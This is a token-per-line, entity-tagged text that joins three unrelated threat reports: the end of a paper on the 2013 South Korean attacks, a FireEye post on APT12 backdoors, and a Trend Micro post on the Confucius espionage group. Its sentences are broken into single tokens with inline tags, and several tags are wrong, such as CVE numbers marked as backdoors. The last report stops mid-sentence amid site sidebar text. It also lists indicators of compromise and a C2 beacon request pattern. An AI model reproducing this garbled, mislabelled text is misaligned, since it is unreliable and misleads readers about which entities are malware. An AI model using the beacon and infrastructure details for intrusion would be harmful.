low
tech
threat
which
managed
to
escalate
into
a
high
impact
attack
.

Successful
in
carrying
out
its
goals
,
the
malware
was
lacking
in
many
areas
that
would
be
typically
found
in
attacks
by
advanced
persistent
threats
.

We
highlighted
the
components
of
the
malware
used
and
the
possible
design
principles
that
could
have
been
employed
to
make
the
attack
more
sophisticated
.

South
Korea
is
more
at
risk
now
than
before
the
attack
,
as
now
adversaries
less
capable
than
advanced
persistent
threats
realize
they
could
also
successfully
perform
damaging
attacks
.

Undertaking
the
needed
remediation
strategies
to
prevent
similar
attacks
as
well
as
understanding
the
anatomy
of
more
advanced
malware
is
vital
for
mounting
an
adequate
defense
against
the
advanced
cyber
threats
.

ACKNOWLEDGEMENT

This
research
was
supported
by
Basic
Science
Research

Program
through
the
National
Research
Foundation
of
Korea
(
NRF
)
funded
by
the
Ministry
of
Education
,
Science
and
Technology
(
grant
number
:
2012-0008447
)
.

REFERENCES

[
1
]
'
South
Korea
blames
North
for
bank
and
TV
cyber-attacks
,
'
BBC
News
,
[
online
]
10
April
2013
,
Available
:
http://www.bbc.co.uk/news/technology-22092051 B_url.normal
(
Accessed
:
18
April
2013
)

[
2
]
He-suk
Choi
.

'
Seoul
blames
Pyongyang
for
cyber
attacks
,
'
The
Korea
Herald
,
[
online
]
10
April
2013
,
Available
:
http://www.koreaherald.com/view.php?ud=20130410000766 B_url.normal
(
Accessed
:
18
April
2013
)

[
3
]
J
.
Horejsi
.
'
Analysis
of
Chinese
attack
against
Korean
banks
,
'
Avast
!
Blog
,
[
online
]
19
March
2013
,
Available
:
https://blog.avast.com/2013/03/19/analysis-of-chinese-attack-againstkorean-banks/ B_url.normal
(
Accessed
:
18
April
2013
)

[
4
]
J
.
Schwartz
,
'
South
Korea
Changes
Story
On
Bank
Hacks
,
'
Information
Week
[
online
]
22
March
2013
,
Available
:
http://www.informationweek.com/security/attacks/south-korea-changesstory-on-bank-hacks/240151542  B_url.normal
(
Accessed
:
18
April
2013
)

[
5
]
'
Remote
Linux
Wiper
Found
in
South
Korean
Cyber
Attack
,
'
Symantec
Connect
[
online
]
20
March
2013
,
Available
:
http://www.symantec.com/connect/blogs/remote-linux-wiper-foundsouth-korean-cyber-attack B_url.normal
(
Accessed
:
18
April
2013
)

[
6
]
'
Trojan.Jokra  B_malware.unknown
,
'
Symantec
Security
Response
,
[
online
]
27
March
2013
,
Available
:
http://www.symantec.com/security_response/writeup.jsp?docid=2013032014-2531-99  B_url.normal
(
Accessed
:
18
April
2013
)

[
7
]
'
CVE-2012-1889 B_malware.backdoor
,
'
Common
Vulnerabilities
and
Exposures
,
[
online
]
22
March
2012
,
Available
:
http://www.cve.mitre.org/cgibin/cvename.cgi?name=CVE-2012-1889  B_url.normal
(
Accessed
:
18
April
2013
)

[
8
]
Metasploit
,
'
Microsoft
XML
Core
Services
MSXML
Uninitialized
Memory
Corruption
,
'
The
Exploit
Database
,
[
online
]
http://www.exploit-db.com/exploits/19186/ B_url.normal
(
Accessed
:
18
April
2013
)

[
9
]
J
.
Blasco
,
'
A
theory
on
the
South
Korean
attacks
,
'
Alien
Vault
Labs
[
online
]
20
March
2013
,
Available
:
http://labs.alienvault.com/labs/index.php/2013/a-theory-on-the-southkorean-attacks/ B_url.normal
(
Accessed
:
18
April
2013
)

[
10
]
'
Trojan.Jokra  B_malware.unknown
,
'
Symantec
Security
Response
,
[
online
]
27
March
2013
,
Available
:
http://www.symantec.com/security_response/writeup.jsp?docid=2013032014-2531-99&tabid=2  B_url.normal
(
Accessed
:
18
April
2013
)

[
11
]
G
.
McDonald
,
L.O.
Murchu
,
S
.
Doherty
,
and
E
.
Chien
,
'
Stuxnet B_malware.backdoor
0.5
:
The
Missing
Link
,
'
Symantec
Security
Response
[
online
]
26
February
2013
,
Available
:
http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/stuxnet_0_5_the_missing_link.pdf B_url.normal

[
12
]
N
.
Falliere
,
L
.
O
.
Murchu
,
and
E
.
Chien
,
'
W32.stuxnet B_malware.backdoor
dossier
,
'
Symantec
,
Symantec
Security
Response
[
online
]
February
2011
.
[
online
]
.
Available
:
http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/w32_stuxnet_dossier.pdf  B_url.normal
[13]
Albright
,
D
.
,
Brannan
P
.
,
Walrond
,
C
.
'
Did
Stuxnet B_malware.backdoor
Take
Out
1,000
Centrifuges
at
the
Natanz
Enrichment
Plant
?
'
Institute
for
Science
and
International
Security
[
online
]
22
December
2010
,
Available
:
http://isisonline.org/isis-reports/detail/did-stuxnet-take-out-1000-centrifuges-atthe-natanz-enrichment-plant/  B_url.normal
(
Accessed
:
18
April
2013
)

[
14
]
'
10
Days
of
Rain
in
Korea
,
'
McAfee
Blog
Central
[
online
]
5
July
2011
,
Available
:
http://blogs.mcafee.com/mcafee-labs/10-days-of-rain-in-korea  B_url.normal
(
Accessed
:
18
April
2013
)

[
15
]
'
Ten
Days
of
Rain
Whitepaper
,
'
McAfee
,
5
July
2011

[
16
]
'
SK
Hack
by
an
Advanced
Persistent
Threat
,
'
Command
Five
[
online
]
September
2011
,
Available
:
http://www.commandfive.com/papers/C5_APT_SKHack.pdf B_url.normal
(
Accessed
:
18
April
2013
)

[
17
]
Moon-young
Lee
,
'
Personal
information
hack
traced
to
Chinese
IP
address
'
The
Hankyoreh
[
online
]
12
August
2011
,
Available
:
http://www.hani.co.kr/arti/english_edition/e_national/491514.html B_url.normal
(
Accessed
:
18
April
2013
)

[
18
]
'
South
Korea
Probe
Blames
North
for
Cyber
Attack
'
VOA
News
[
online
]
10
April
2013
,
Available
:
http://www.voanews.com/articleprintview/1638361.html  B_url.normal
(
Accessed
:
18
April
2013
)

[
19
]
J.A.P.
Marpaung
,
M
.
Sain
,
H.J.
Lee
,
'
Survey
on
Malware
Evasion
Techniques
:
State
of
the
Art
and
Challenges
'
in
14th
International
Conference
on
Advanced
Communication
Technologies
,
2012
,
pp
744749
.
Darwin's
Favorite
APT
Group

Introduction

The
attackers
referred
to
as
APT12
(
also
known
as
IXESHE
,
DynCalc
,
and
DNSCALC
)
recently
started
a
new
campaign
targeting
organizations
in
Japan
and
Taiwan
.

APT12
is
believed
to
be
a
cyber
espionage
group
thought
to
have
links
to
the
Chinese
People's
Liberation
Army
.

APT12′s
targets
are
consistent
with
larger
People's
Republic
of
China
(
PRC
)
goals
.

Intrusions
and
campaigns
conducted
by
this
group
are
inline
with
PRC
goals
and
self-interest
in
Taiwan
.

Additionally
,
the
new
campaigns
we
uncovered
further
highlight
the
correlation
between
APT
groups
ceasing
and
retooling
operations
after
media
exposure
,
as
APT12
used
the
same
strategy
after
compromising
the
New
York
Times
in
Oct
2012
.

Much
like
Darwin's
theory
of
biological
evolution
,
APT12
been
forced
to
evolve
and
adapt
in
order
to
maintain
its
mission
.

The
new
campaign
marks
the
first
APT12
activity
publicly
reported
since
Arbor
Networks
released
their
blog
'
Illuminating
The
Etumbot B_malware.backdoor
APT
Backdoor
.

'
FireEye
refers
to
the
Etumbot B_malware.backdoor
backdoor
as
RIPTIDE B_malware.backdoor
.

Since
the
release
of
the
Arbor
blog
post
,
FireEye
has
observed
APT12
use
a
modified
RIPTIDE B_malware.backdoor
backdoor
that
we
call
HIGHTIDE  B_malware.backdoor
.

This
is
the
second
time
FireEye
has
discovered
APT12
retooling
after
a
public
disclosure
.

As
such
,
FireEye
believes
this
to
be
a
common
theme
for
this
APT
group
,
as
APT12
will
continue
to
evolve
in
an
effort
to
avoid
detection
and
continue
its
cyber
operations
.

FireEye
researchers
also
discovered
two
possibly
related
campaigns
utilizing
two
other
backdoors
known
as
THREEBYTE B_malware.backdoor
and
WATERSPOUT  B_malware.backdoor
.

Both
backdoors
were
dropped
from
malicious
documents
built
utilizing
the
'
Tran  B_malware.backdoor
Duy I
Linh  I
'
exploit
kit
,
which
exploited
CVE-2012-0158 B_malware.backdoor
.

These
documents
were
also
emailed
to
organizations
in
Japan
and
Taiwan
.

While
APT12
has
previously
used
THREEBYTE B_malware.backdoor
,
it
is
unclear
if
APT12
was
responsible
for
the
recently
discovered
campaign
utilizing
THREEBYTE B_malware.backdoor
.

Similarly
,
WATERSPOUT  B_malware.backdoor
is
a
newly
discovered
backdoor
and
the
threat
actors
behind
the
campaign
have
not
been
positively
identified
.

However
,
the
WATERSPOUT  B_malware.backdoor
campaign
shared
several
traits
with
the
RIPTIDE B_malware.backdoor
and
HIGHTIDE  B_malware.backdoor
campaign
that
we
have
attributed
to
APT12
.

Background

From
October
2012
to
May
2014
,
FireEye
observed
APT12
utilizing
RIPTIDE B_malware.backdoor
,
a
proxy-aware B_malware.backdoor
backdoor  I
that
communicates
via
HTTP
to
a
hard-coded
command
and
control
(
C2
)
server
.

RIPTIDE's
first
communication
with
its
C2
server
fetches
an
encryption
key
,
and
the
RC4
encryption
key
is
used
to
encrypt
all
further
communication
.

Figure
1
:
RIPTIDE B_malware.backdoor
HTTP
GET
Request
Example

In
June
2014
,
Arbor
Networks
published
an
article
describing
the
RIPTIDE B_malware.backdoor
backdoor
and
its
C2
infrastructure
in
great
depth
.

The
blog
highlighted
that
the
backdoor
was
utilized
in
campaigns
from
March
2011
till
May
2014
.

Following
the
release
of
the
article
,
FireEye
observed
a
distinct
change
in
RIPTIDE's
protocols
and
strings
.

We
suspect
this
change
was
a
direct
result
of
the
Arbor
blog
post
in
order
to
decrease
detection
of
RIPTIDE B_malware.backdoor
by
security
vendors
.

The
changes
to
RIPTIDE B_malware.backdoor
were
significant
enough
to
circumvent
existing
RIPTIDE B_malware.backdoor
detection
rules
.

FireEye
dubbed
this
new
malware
family
HIGHTIDE  B_malware.backdoor
.

HIGHTIDE  B_malware.backdoor
Malware
Family

On
Sunday
August
24
,
2014
we
observed
a
spear B_malware.infosteal
phish I
email
sent
to
a
Taiwanese
government
ministry
.

Attached
to
this
email
was
a
malicious
Microsoft
Word
document
(
MD5
:
f6fafb7c30b1114befc93f39d0698560  B_hash
)
that
exploited
CVE-2012-0158 B_malware.backdoor
.

It
is
worth
noting
that
this
email
appeared
to
have
been
sent
from
another
Taiwanese
Government
employee
,
implying
that
the
email
was
sent
from
a
valid
but
compromised
account
.

Figure
2
:
APT12
Spearphishing B_malware.infosteal
Email

The
exploit
document
dropped
the
HIGHTIDE  B_malware.backdoor
backdoor
with
the
following
properties
:

Size

Complie

Time

Import

Hash
6e59861931fa2796ee107dc27bfdd480  B_hash
75264
bytes
2014-08-23
08:22:49
ead55ef2b18a80c00786c25211981570  B_hash

The
HIGHTIDE  B_malware.backdoor
backdoor
connected
directly
to
141.108.2.157 B_ip.unknown
.

If
you
compare
the
HTTP
GET
request
from
the
RIPTIDE B_malware.backdoor
samples
(
Figure
1
)
to
the
HTTP
GET
request
from
the
HIGHTIDE  B_malware.backdoor
samples
(
Figure
3
)
you
can
see
the
malware
author
changed
the
following
items
:

User
Agent

Format
and
structure
of
the
HTTP
Uniform
Resource
Identifier
(
URI
)

Figure
3
:
HIGHTIDE  B_malware.backdoor
GET
Request
Example

Similar
to
RIPTIDE B_malware.backdoor
campaigns
,
APT12
infects
target
systems
with
HIGHTIDE  B_malware.backdoor
using
a
Microsoft
Word
(
.doc
)
document
that
exploits
CVE-2012-0158 B_malware.backdoor
.

FireEye
observed
APT12
deliver
these
exploit
documents
via
phishing
emails
in
multiple
cases
.

Based
on
past
APT12
activity
,
we
expect
the
threat
group
to
continue
to
utilize
phishing
as
a
malware
delivery
method
.

73f493f6a2b0da23a79b50765c164e88  B_hash
議程最新修正及注意事項.doc
f6fafb7c30b1114befc93f39d0698560  B_hash
eaa6e03d9dae356481215e3a9d2914dc  B_hash
簡易名冊0全國各警察機關主官至分局
0824.1.doc

File
Name
長.doc
06da4eb2ab6412c0dc7f295920eb61c4  B_hash
附檔.doc
53baedf3765e27fb465057c48387c9b6  B_hash
103年第3屆通(cid:13860)錄.doc
00a95fb30be2d6271c491545f6c6a707  B_hash
2014
09
17
Welcome
Reception
for
Bob
4ab6bf7e6796bb930be2dd0141128d06  B_hash
產諮會_Y103(2)委員會_從東協新興國家
and
Jason_invitation.doc
崛起(0825).doc

Exploit

CVE-2012-0158 B_malware.backdoor

CVE-2012-0158 B_malware.backdoor

CVE-2012-0158 B_malware.backdoor

CVE-2012-0158 B_malware.backdoor

CVE-2012-0158 B_malware.backdoor

CVE-2012-0158 B_malware.backdoor

CVE-2012-0158 B_malware.backdoor

Figure
4
:
Identified
exploit
documents
for
HIGHTIDE  B_malware.backdoor

When
the
file
is
opened
,
it
drops
HIGHTIDE  B_malware.backdoor
in
the
form
of
an
executable
file
onto
the
infected
system
.

RIPTIDE B_malware.backdoor
and
HIGHTIDE  B_malware.backdoor
differ
on
several
points
:
executable
file
location
,
image
base
address
,
the
User-
Agent
within
the
GET
requests
,
and
the
format
of
the
URI
.

The
RIPTIDE B_malware.backdoor
exploit
document
drops
its
executable
file
into
the
C:\Documents
and
Settings\{user}\Application
Data\Location
folder
while
the
HIGHTIDE  B_malware.backdoor
exploit
document
drops
its
executable
file
into
the
C:\DOCUMENTS
and
SETTINGS\
{user}\LOCAL
SETTINGS\Temp\
folder
.

All
but
one
sample
that
we
identified
were
written
to
this
folder
as
word.exe
.

The
one
outlier
was
written
as
winword.exe
.

Research
into
this
HIGHTIDE  B_malware.backdoor
campaign
revealed
APT12
targeted
multiple
Taiwanese
Government
organizations
between
August
22
and
28
.

THREEBYTE B_malware.backdoor
Malware
Family

On
Monday
August
25
,
2014
we
observed
a
different
spear B_malware.infosteal
phish I
email
sent
from
lilywang823@gmail.com
to
a
technology
company
located
in
Taiwan
.

This
spear B_malware.infosteal
phish I
contained
a
malicious
Word
document
that
exploited
CVE-2012-0158 B_malware.backdoor
.

The
MD5
of
the
exploit
document
was
e009b95ff7b69cbbebc538b2c5728b11  B_hash
.

Similar
to
the
newly
discovered
HIGHTIDE  B_malware.backdoor
samples
documented
above
,
this
malicious
document
dropped
a
backdoor
to
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe
.

This
backdoor
had
the
following
properties
:

Size

Complie

Time

Import

Hash
16e627dbe730488b1c3d448bfc9096e2  B_hash
75776
bytes
2014-08-25
01:22:20
dcfaa2650d29ec1bd88e262d11d3236f  B_hash

This
backdoor
sent
the
following
callback
traffic
to
video[.]csmcpr[.]com  B_url.unknown
:

Figure
5
:
THREEBYTE B_malware.backdoor
GET
Request
Beacon

The
THREEBYTE B_malware.backdoor
spear B_malware.infosteal
phishing  I
incident
(
while
not
yet
attributed
)
shared
the
following
characteristics
with
the
above
HIGHTIDE  B_malware.backdoor
campaign
attributed
to
APT12
:

The
THREEBYTE B_malware.backdoor
backdoor
was
compiled
two
days
after
the
HIGHTIDE  B_malware.backdoor
backdoors
.

Both
the
THREEBYTE B_malware.backdoor
and
HIGHTIDE  B_malware.backdoor
backdoors
were
used
in
attacks
targeting
organizations
in
Taiwan
.

Both
the
THREEBYTE B_malware.backdoor
and
HIGHTIDE  B_malware.backdoor
backdoors
were
written
to
the
same
filepath
of
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe
.

APT12
has
previously
used
the
THREEBYTE B_malware.backdoor
backdoor
.

WATERSPOUT  B_malware.backdoor
Malware
Family

On
August
25
,
2014
,
we
observed
another
round
of
spear B_malware.infosteal
phishing  I
emails
targeting
a
high-technology
company
in
Japan
.

Attached
to
this
email
was
another
malicious
document
that
was
designed
to
exploit
CVE-2012-0158 B_malware.backdoor
.

This
malicious
Word
document
had
an
MD5
of
499bec15ac83f2c8998f03917b63652e  B_hash
and
dropped
a
backdoor
to
C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe
.

The
backdoor
had
the
following
properties
:

Size

Complie

Time

Import

Hash
f9cfda6062a8ac9e332186a7ec0e706a  B_hash
49152
bytes
2014-08-25
02:10:11
864cd776c24a3c653fd89899ca32fe0b  B_hash

The
backdoor
connects
to
a
command
and
control
server
at
icc[.]ignorelist[.]com  B_url.cncsvr
.

Similar
to
RIPTIDE B_malware.backdoor
and
HIGHTIDE  B_malware.backdoor
,
the
WATERSPOUT  B_malware.backdoor
backdoor
is
an
HTTP-based
backdoor
that
communicates
with
its
C2
server
.

GET
/<string>/<5
digit
number>/<4
character
string>.php?<first
3
characters
of
last
string>_id=<43
character
string>=
HTTP/1.1

Accept
:
image/jpeg
,
application/x-ms-application
,
image/gif
,
application/xaml+xml
,
image/pjpeg
,
application/x-ms-xbap
,
*/*

User-Agent
:
Mozilla/4.0
(
compatible;
MSIE
8.0;
Windows
NT
6.1;

Trident/4.0;
SLCC2;
.NET
CLR
2.0.50727;
.NET
CLR
3.5.30729;
.NET

CLR
3.0.30729;
.NET4.0C;
.NET4.0E
)

Host
:
<C2
Location>

Cache-Control
:
no-cache

Figure
6
:
Sample
GET
request
for
WATERSPOUT  B_malware.backdoor
backdoor

Although
there
are
no
current
infrastructure
ties
to
link
this
backdoor
to
APT12
,
there
are
several
data
points
that
show
a
possible
tie
to
the
same
actors
:

Same
initial
delivery
method
(
spear B_malware.infosteal
phishing  I
email
)
with
a
Microsoft
Word
Document
exploiting
CVE-2012-0158 B_malware.backdoor
.

The
same
'
Tran  B_malware.backdoor
Duy I
Linh  I
'
Microsoft
Word
Exploit
Kit
was
used
in
delivery
of
this
backdoor
.

Similar
Targets
were
observed
where
the
threat
actors
utilized
this
backdoor
.

Japanese
Tech
Company

Taiwanese
Government
Organizations

Organizations
in
the
Asia-Pacific
Region
that
are
of
Interest
to
China

The
WATERSPOUT  B_malware.backdoor
backdoor
was
written
to
the
same
file
path
as
the
HIGHTIDE  B_malware.backdoor
backdoors
:

C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\word.exe

C:\DOCUMENTS
and
SETTINGS\{user}\LOCAL
SETTINGS\Temp\winword.exe

WATERSPOUT  B_malware.backdoor
was
compiled
within
two
days
of
the
last
HIGHTIDE  B_malware.backdoor
backdoor
and
on
the
same
day
as
the
THREEBYTE B_malware.backdoor
backdoor
.

Although
these
points
do
not
definitively
tie
WATERSPOUT  B_malware.backdoor
to
APT12
,
they
do
indicate
a
possible
connection
between
the
WATERSPOUT  B_malware.backdoor
campaign
,
the
THREEBYTE B_malware.backdoor
campaign
,
and
the
HIGHTIDE  B_malware.backdoor
campaign
attributed
to
APT12
.

Conclusion

FireEye
believes
the
change
from
RIPTIDE B_malware.backdoor
to
HIGHTIDE  B_malware.backdoor
represents
a
temporary
tool
shift
to
decrease
malware
detection
while
APT12
developed
a
completely
new
malware
toolset
.

These
development
efforts
may
have
resulted
in
the
emergence
of
the
WATERSPOUT  B_malware.backdoor
backdoor
.

Figure
7
:
Compile
dates
for
all
three
malware
families

APT12's
adaptations
to
public
disclosures
lead
FireEye
to
make
several
conclusions
about
this
threat
group
:

APT12
closely
monitors
online
media
related
to
its
tools
and
operations
and
reacts
when
its
tools
are
publicly
disclosed
.

APT12
has
the
ability
to
adapt
quickly
to
public
exposures
with
new
tools
,
tactics
,
and
procedures
(
TTPs
)
.

Public
disclosures
may
result
in
an
immediate
change
in
APT12's
tools
.

These
changes
may
be
temporary
and
FireEye
believes
they
are
aimed
at
decreasing
detection
of
their
tools
until
a
more
permanent
and
effective
TTP
change
can
be
implemented
(
e.g.
,
WATERSPOUT  B_malware.backdoor
)
.

Though
public
disclosures
resulted
in
APT12
adaptations
,
FireEye
observed
only
a
brief
pause
in
APT12
activity
before
the
threat
actors
returned
to
normal
activity
levels
.

Similarly
,
the
public
disclosure
of
APT12's
intrusion
at
the
New
York
Times
also
led
to
only
a
brief
pause
in
the
threat
group's
activity
and
immediate
changes
in
TTPs
.

The
pause
and
retooling
by
APT12
was
covered
in
the
Mandiant
2014
M
-
Trends
report
.

Currently
,
APT12
continues
to
target
organizations
and
conduct
cyber
operations
using
its
new
tools
.

Most
recently
,
FireEye
observed
HIGHTIDE  B_malware.backdoor
at
multiple
Taiwan-based
organizations
and
the
suspected
APT12
WATERSPOUT  B_malware.backdoor
backdoor
at
a
Japan-based
electronics
company
.

We
expect
that
APT12
will
continue
their
trend
and
evolve
and
change
its
tactics
to
stay
ahead
of
network
defenders
.

Note
:
IOCs
for
this
campaign
can
be
found
here
.

This
entry
was
posted
in
Botnets
,
Targeted
Attack
,
Threat
Intelligence
,
Threat
Research
and
tagged
advanced
malware
,
advanced
persistent
threat
,
advanced
targeted
attack
,
advanced
threat
actor
,
APT12
,
Targeted
Attack
by
Ned
Moran
,
Mike
Oppenheim
,
Sarah
Engle
and
Richard
Wartell
.

Bookmark
the
permalink
.
Trend
Micro
About
TrendLabs
Security
Intelligence
Blog

Home

Search
:

Categories

Home
'
Targeted
Attacks
'
Deciphering
Confucius
'
cyberespionage  B_malware.backdoor
Operations

Deciphering
Confucius
'
cyberespionage  B_malware.backdoor
Operations

Posted
on
:
February
13
,
2018
at
5:01
am
Posted
in
:
Targeted
Attacks

Author
:

Trend
Micro
Cyber
Safety
Solutions
Team
by
Daniel
Lunghi
and
Jaromir
Horejsi

In
today's
online
chat
and
dating
scene
,
romance
scams
are
not
uncommon
,
what
with
catfishers
and
West
African
cybercriminals
potently
toying
with
their
victims
'
emotions
to
cash
in
on
their
bank
accounts
.

It's
quite
odd
(
and
probably
underreported
)
,
however
,
to
see
it
used
as
a
vector
for
cyberespionage  B_malware.backdoor
.

We
stumbled
upon
the
Confucius
hacking
group
while
delving
into
Patchwork's
cyberespionage  B_malware.backdoor
operations
,
and
found
a
number
of
similarities
.

Code
in
their
custom
malware
bore
similarities
,
for
instance
.

Confucius
targeted
a
particular
set
of
individuals
in
South
Asian
countries
,
such
as
military
personnel
and
businessmen
,
among
others
.

Are
Patchwork
and
Confucius
the
same
group
?
The
commands
in
their
backdoors
do
resemble
each
other
.

The
config
files
have
a
similar
,
custom
structure
,
and
both
groups
have
infrastructure
overlap
.

However
,
we
construe
them
to
be
different
groups
,
possibly
within
the
same
community
,
with
different
objectives
and
modi
operandi
.

While
Patchwork
may
be
more
straightforward
with
its
predominantly
malware-based
attacks
,
Confucius
'
can
be
inferred
to
be
more
nuanced
,
relying
heavily
on
social
engineering
.

Exploiting
the
human
psyche
with
chat
apps

Probing
Confucius
'
infrastructure
,
we
came
across
websites
offering
Windows
and
Android
chat
applications
,
most
likely
iterations
of
its
predecessor
,
Simple
Chat
Point
:
Secret
Chat
Point
,
and
Tweety  B_malware.backdoor
Chat  I
.

We
are
admittedly
uncertain
of
the
extent
—
and
success
—
of
their
use
,
but
it's
one
of
the
ingredients
of
the
group's
operations
.

While
the
chat
applications
indeed
have
real
chat
features
(
although
the
communication
is
not
anonymous
,
as
advertised
)
,
they
have
backdoor
routines
and
file-stealing
behaviors
that
get
triggered
when
specific
words
are
sent
to
the
app
:
collecting
and
harvesting
all
SMS
messages
,
contacts
,
and
accounts
.

Tweety  B_malware.backdoor
Chat's
Android
version
can
record
audio
,
too
.

Its
latest
version
can
mute
the
device
(
i.e.
,
take
out
the
ringtone
and
vibration
features
)
and
sync
call
logs
and
SMSs
.

We
further
tested
Tweety  B_malware.backdoor
Chat  I
and
saw
red
flags
indicating
their
targets
of
interest
:
verification
emails
with
a
physical
address
whose
postal
code
is
assigned
to
a
provincial
capital
that
also
appears
(
upon
logging
in
)
as
a
chat
channel
in
Tweety  B_malware.backdoor
Chat  I
.

Featured
Stories
systemd
Vulnerability
Leads
to
Denial
of
Service
on
Linux
qkG B_malware.ransom
Filecoder I
:
Self-
Replicating
,
Document-
Encrypting
Ransomware

Mitigating
CVE-2017-5689 B_malware.backdoor
,
an
Intel
Management
Engine
Vulnerability

A
Closer
Look
at
North
Korea's
Internet

From
Cybercrime
to
Cyberpropaganda

Security
Predictions
for
2018

Attackers
are
banking
on
network
vulnerabilities
and
inherent
weaknesses
to
facilitate
massive
malware
attacks
,
IoT
hacks
,
and
operational
disruptions
.

The
ever-shifting
threats
and
increasingly
expanding
attack
surface
will
challenge
users
and
enterprises
to
catch
up
with
their
security
.

Read
our
security
predictions
for
2018
.

Business
Process

Compromise

Attackers
are
starting
to
invest
in
long-term
operations
that
target
specific
processes
enterprises
rely
on
.

They
scout
for
vulnerable
practices
,
susceptible
systems
and
operational
loopholes
that
they
can
leverage
or
abuse
.

To
learn
more
,
read
our
Security
101
:

Business
Process
Compromise
.

Latest
Ransomware
Posts

Figure
1
:
Tweety  B_malware.backdoor
Chat's
interface
(
top
)
,
and
code
snippets
showing
the
file
types
it
steals
(
bottom
)

Romance
in
cyberespionage  B_malware.backdoor

The
user
list
,
chat
room
names
,
and
content
of
the
applications
were
stored
in
a
remote
server
without
any
authentication
.

The
chat
logs
shed
light
on
the
social
engineering
used
by
the
operators
to
persuade
victims
to
install
the
cyberespionage  B_malware.backdoor
malware
on
their
Android
devices
.

The
first
user
and
chatroom
were
created
on
August
27
,
2017
,
and
were
probably
the
app
authors
'
testing
ground
.

The
succeeding
users
and
chatrooms
were
created
on
October
31
and
December
12
the
latest
.

A
certain
hayat22
and
love
piqued
our
interest
.

hayat22
,
supposedly
a
female
student
,
engaged
in
an
online
romance
with
a
target
whose
handle
was
love
,
describing
himself
as
living
in
South
Asia
working
in
garments
manufacturing
and
wholesaling
.

Over
the
course
of
their
correspondence
,
love
suggested
using
WhatsApp
to
communicate
.

hayat22
declined
,
saying
she
felt
safer
using
Tweety  B_malware.backdoor
Chat  I
.

love
refused
,
but
when
hayat22
demurred
and
gave
love
an
online
cold
shoulder
,
love
tried
installing
Tweety  B_malware.backdoor
Chat  I
—
and
failed
.

He
claimed
that
he
wasn't
able
to
install
the
app
.

hayat22
quickly
lost
interest
and
stopped
replying
to
him
altogether
.

She
also
sent
him
a
screenshot
to
show
what
Tweety  B_malware.backdoor
Chat  I
looked
like
.

We're
not
sure
how
love
wound
up
in
the
chat
room
or
how
he
met
hayat22
.

He
was
probably
either
using
the
Windows
version
of
Secret
Chat
Point
or
its
web
interface
,
which
explains
why
hayat22
was
urging
him
to
install
Android
Tweety  B_malware.backdoor
Chat  I
.

In
an
earlier
chat
group
,
an
operator
called
Heena
urged
the
members
to
install
Secret
Chat
Point
on
other
people's
mobile
devices
to
get
perks
like
credits
or
the
ability
to
'
go
invisible
'
.

In
another
chat
room
called
'
Maira's
room
'
,
a
target
of
interest
disclosed
he
was
a
government
officer
traveling
back
from
a
northern
city
near
the
country's
provincial
capital
.

A
few
days
after
,
the
operator
stopped
answering
in
the
chat
room
,
and
her
user
account
was
deleted
from
the
server
.

Figure
2
:
ByeBye  B_malware.backdoor
Shell's
interface
showing
Confucius
'
campaigns

Figure
3
:
Screenshot
showing
a
group
chat
where
the
moderator
is
urging
users
to
install
Tweety  B_malware.backdoor
Chat  I

Digital
Extortion
:
A
Forwardlooking
View

qkG B_malware.ransom
Filecoder I
:
Self-
Replicating
,
Document-
Encrypting
Ransomware

Bad B_malware.ransom
Rabbit  I
Ransomware  I
Spreads
via
Network
,
Hits
Ukraine
and
Russia

A
Look
at
Locky B_malware.ransom
Ransomware's
Recent
Spam
Activities

Magnitude
Exploit
Kit
Now
Targeting
South
Korea
With
Magniber  B_malware.ransom
Ransomware  I

Recent
Posts

Tropic
Trooper's
New
Strategy

March
Patch
Tuesday
Fixes
75
Security
Issues
,
Drops
Registry
Key
Requirement
in
Windows
Detecting
Attacks
that
Exploit
Meltdown
and
Spectre
with
Performance
Counters
Campaign
Possibly
Connected
to
'
MuddyWater
'
Surfaces
in
the
Middle
East
and
Central
Asia

Cryptocurrency-Mining

Malware
:
2018's
New
Menace
?

Ransomware
101

This
infographic
shows
how
ransomware
has
evolved
,
how
big
the
problem
has
become
,
and
ways
to
avoid
being
a
ransomware
victim
.

Check
the
infographic

Popular
Posts

Homemade
Browser

Targeting
Banco
do
Brasil
Users
Vulnerabilities
in
Apache
CouchDB
Open
the
Door
to
Monero
Miners
Oracle
Server
Vulnerability
Exploited
to
Deliver
Double
Monero
Miner
Payloads

Cryptocurrency-Mining
Malware
:
2018's
New
Menace
?

New
AndroRAT  B_malware.infosteal
Exploits
Dated
Privilege
Escalation
Vulnerability
,
Allows
Permanent
Rooting

Stay
Updated

Email
Subscription

Figure
4
:
Screenshot
showing
Tweety  B_malware.backdoor
Chat  I
promoted
in
social
media

A
tangled
web
of
malware

Confucius
'
operations
include
deploying
bespoke
backdoors
and
stealing
files
from
their
victim's
systems
with
tailored
file
stealers
,
some
of
which
bore
resemblances
to
Patchwork's
.

The
stolen
files
are
then
exfiltrated
by
abusing
a
cloud
storage
service
.

Some
of
these
file
stealers
specifically
target
files
from
USB
devices
,
probably
to
overcome
air-gapped
environments
.

Compared
to
Patchwork
,
whose
Trojanized
documents
exploit
at
least
five
security
flaws
,
Confucius
'
backdoors
are
delivered
through
Office
files
exploiting
memory
corruption
vulnerabilities
CVE-2015-1641 B_malware.unknown
and
CVE-2017-11882  B_malware.backdoor
.

Their
malware's
resemblance
to
that
of
Patchwork's
is
also
notable
.

The
use
of
an
exploit
for
a
security
flaw
disclosed
in
December
2017
and
their
recent
activities
suggest
Confucius
is
keenly
trailing
their
targets
.

Confucius
has
a
miscellany
of
backdoors
:
sctrls  B_malware.infosteal
,
ByeBye  B_malware.backdoor
Shell
,
remote-access-c3  B_malware.infosteal
,
and
sip_telephone B_malware.infosteal
,
to
name
a
few
.

One
of
its
file
stealers
,
swissknife2 B_malware.infosteal
,
abuses
a
cloud
storage
service
as
a
repository
of
exfiltrated
files
.

At
the
time
of
research
,
there
were
around
60
victims
whose
data
were
uploaded
to
Confucius-owned
cloud
storage
account
.

There
were
also
a
few
thousand
files
in
the
account
that
were
later
deleted
.

Our
research
,
Deciphering
Confucius
:
A
Look
at
the
Group's
cyberespionage  B_malware.backdoor
Operations
,
delves
into
the
group's
operations
,
the
social
